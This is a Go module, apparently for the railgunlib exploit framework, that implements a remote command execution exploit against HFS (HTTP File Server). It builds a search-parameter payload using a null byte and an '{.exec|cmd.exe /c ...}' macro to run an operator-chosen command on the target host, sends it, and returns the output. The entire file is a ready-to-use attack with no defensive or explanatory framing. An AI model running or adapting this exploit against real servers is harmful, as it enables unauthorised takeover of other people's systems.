package exp_HFS

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_RCE struct {
	exp_templates.ExpTemplate
}

func (self *Exp_RCE) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := "?search==%00{.exec|cmd.exe /c lz520520.}"
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	cmd = url.PathEscape(shellPayload)
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload

	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_RCE{}, "exp_rce.yml")
}
